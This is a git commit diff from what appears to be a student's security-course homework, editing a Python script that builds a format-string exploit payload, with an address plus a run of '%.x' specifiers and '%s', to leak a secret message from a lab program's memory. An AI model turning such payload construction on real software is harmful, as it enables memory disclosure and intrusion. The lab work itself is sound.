8b54da8cc347e969c3b8abfdfdc6ed926c040bbf
Robert D. Hernandez <rherna70@uic.edu>
2024-10-22 21:14:58 -0500

    save wip, add sample code from fmtstring lecture

--- hw5/attack-code/build_string_v3.py
+++ hw5/attack-code/build_string_v3.py
@@ -1,9 +1,6 @@
 #!/usr/bin/python3
 import sys
 
-# Address of the secret message
-secret_msg_addr = 0x080af014
-
 N = 1500
 
 # Initialize payload with 1500 bytes
@@ -12,25 +9,18 @@ N = 1500
 # Fill the content with NOP's
 content = bytearray(0x90 for i in range(N))
 
-# This line shows how to store a 4-byte integer at offset 0
-number  = 0xbfffeeee
-content[0:4]  =  (number).to_bytes(4,byteorder='little')
+# Address of the secret message
+# secret_msg_addr = 0x080af014
+secret_msg_addr = 0xffffc920
+content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
 
-# This line shows how to store a 4-byte string at offset 4
-content[4:8]  =  ("abcd").encode('latin-1')
-
-# s = "%.8x x" * 746 + "%s\n"  # 10 entries + %s at 11th position
-s = "%8x. x" * 200 + "%s\n"  # 10 entries + %s at 11th position
+s = "%.x" * 70 + "%s\n"
 fmt = s.encode('latin-1')
 
-offset=8
+offset=4
 
 # Store the format string in the payload
 content[offset:offset+len(fmt)] = fmt
-
-# Place the secret message address at the end of the format string
-addr_offset = len(fmt)
-content[addr_offset:addr_offset+4] = (secret_msg_addr).to_bytes(4, byteorder='little')
 
 # Write payload to badfile
 with open('badfile', 'wb') as f:
